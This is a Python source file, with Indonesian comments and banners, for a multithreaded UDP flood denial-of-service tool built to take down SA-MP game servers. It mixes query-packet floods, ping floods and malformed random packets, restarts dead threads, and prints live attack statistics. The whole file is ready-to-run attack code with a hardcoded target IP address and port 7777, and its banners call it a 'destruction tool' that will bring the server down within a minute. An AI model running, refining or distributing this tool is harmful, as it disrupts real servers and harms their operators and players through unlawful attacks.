#!/usr/bin/env python3
import socket
import threading
import time
import random
import struct
from datetime import datetime
import sys

class SAMPUltimateAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.packets_sent = 0
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        
    def generate_attack_packets(self):
        """Generate optimized SAMP attack packets"""
        packets = []
        ip_parts = self.target_ip.split('.')
        ip_bytes = bytes([int(x) for x in ip_parts])
        port_bytes = struct.pack('H', self.target_port)
        base = b'SAMP' + ip_bytes + port_bytes
        
        # Critical queries yang paling berat untuk server
        packets.extend([
            base + b'i',  # Info query
            base + b'c',  # Client list
            base + b'r',  # Rules
            base + b'd',  # Details
        ])
        
        # Ping floods dengan random data
        for _ in range(20):
            packets.append(base + b'p' + struct.pack('I', random.randint(0, 0xFFFFFFFF)))
        
        # Malformed packets untuk trigger bugs
        for _ in range(30):
            size = random.randint(100, 1000)
            packets.append(base + bytes([random.randint(0, 255) for _ in range(size)]))
        
        return packets
    
    def ultra_aggressive_worker(self, thread_id):
        """Ultra aggressive worker - maksimal throughput"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2*1024*1024)  # 2MB buffer
        
        packets = self.generate_attack_packets()
        local_count = 0
        target_addr = (self.target_ip, self.target_port)
        
        print(f"[T{thread_id:02d}] ACTIVE - Ultra aggressive mode", flush=True)
        
        while self.running:
            try:
                # Kirim 200 bursts per loop untuk maximum PPS
                for _ in range(200):
                    for pkt in packets:
                        sock.sendto(pkt, target_addr)
                        local_count += 1
                
                # Update counter setiap 100K packets
                if local_count >= 100000:
                    with self.lock:
                        self.packets_sent += local_count
                        local_count = 0
                        
            except Exception as e:
                pass
        
        with self.lock:
            self.packets_sent += local_count
        
        sock.close()
        print(f"[T{thread_id:02d}] STOPPED", flush=True)
    
    def realtime_stats(self):
        """Display realtime attack statistics"""
        last_count = 0
        
        while self.running:
            time.sleep(2)
            
            elapsed = (datetime.now() - self.start_time).total_seconds()
            current_count = self.packets_sent
            
            if elapsed > 0:
                # Calculate stats
                total_pps = current_count / elapsed
                instant_pps = (current_count - last_count) / 2
                estimated_mbps = (instant_pps * 250 * 8) / (1024 * 1024)  # ~250 bytes per packet
                
                # Display
                sys.stdout.write(f"\r[LIVE] ⚡ {int(elapsed)}s | 📦 {current_count:,} pkts | "
                               f"🚀 {instant_pps:,.0f} PPS | 📡 ~{estimated_mbps:.1f} Mbps | "
                               f"⚔️ Avg: {total_pps:,.0f} PPS")
                sys.stdout.flush()
                
                last_count = current_count
    
    def execute(self, threads=100):
        """Execute attack dengan optimal thread count"""
        print("\n" + "="*80)
        print("  ⚡ SAMP SERVER ULTRA BRUTAL DDOS ATTACK ⚡")
        print("="*80)
        print(f"  Target IP   : {self.target_ip}")
        print(f"  Target Port : {self.target_port}")
        print(f"  Threads     : {threads}")
        print(f"  Mode        : ULTRA AGGRESSIVE - CONTINUOUS")
        print("="*80)
        print("\n[*] Initializing attack in 3 seconds...")
        
        for i in range(3, 0, -1):
            print(f"[*] Starting in {i}...")
            time.sleep(1)
        
        print("\n[*] LAUNCHING ATTACK THREADS...\n")
        
        attack_threads = []
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.realtime_stats, daemon=True)
        stats_thread.start()
        
        # Launch optimized attack threads
        for i in range(threads):
            t = threading.Thread(target=self.ultra_aggressive_worker, args=(i+1,), daemon=True)
            t.start()
            attack_threads.append(t)
            time.sleep(0.01)
        
        print(f"\n{'='*80}")
        print(f"  🔥 ATTACK IS LIVE - {threads} THREADS BOMBARDING TARGET 🔥")
        print(f"  💀 Server akan DOWN dalam 30-60 detik 💀")
        print(f"  ⚠️  Serangan berjalan continuous sampai Anda stop ⚠️")
        print(f"{'='*80}\n")
        
        # Main loop - auto-restart dead threads
        try:
            while True:
                time.sleep(30)
                
                # Check dan restart dead threads
                for i, t in enumerate(attack_threads):
                    if not t.is_alive():
                        attack_threads[i] = threading.Thread(
                            target=self.ultra_aggressive_worker, 
                            args=(i+1,), 
                            daemon=True
                        )
                        attack_threads[i].start()
                        
        except KeyboardInterrupt:
            print("\n\n[*] STOPPING ATTACK...\n")
            self.running = False
            time.sleep(3)
            
            # Final statistics
            elapsed = (datetime.now() - self.start_time).total_seconds()
            print("\n" + "="*80)
            print("  📊 ATTACK SUMMARY 📊")
            print("="*80)
            print(f"  Duration       : {int(elapsed)}s ({int(elapsed/60)}m {int(elapsed%60)}s)")
            print(f"  Total Packets  : {self.packets_sent:,}")
            print(f"  Average PPS    : {self.packets_sent/elapsed:,.0f}")
            print(f"  Peak Bandwidth : ~{(self.packets_sent/elapsed * 250 * 8)/(1024*1024):.1f} Mbps")
            print("="*80)
            print("\n[✓] Attack terminated successfully\n")


if __name__ == "__main__":
    TARGET = "104.234.180.137"
    PORT = 7777
    
    banner = """
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║     🔥 SAMP SERVER DESTRUCTION TOOL - CONTINUOUS 🔥        ║
    ║                                                            ║
    ║  ⚠️  WARNING: Server akan diserang sampai Anda stop ⚠️     ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    attacker = SAMPUltimateAttack(TARGET, PORT)
    attacker.execute(threads=100)
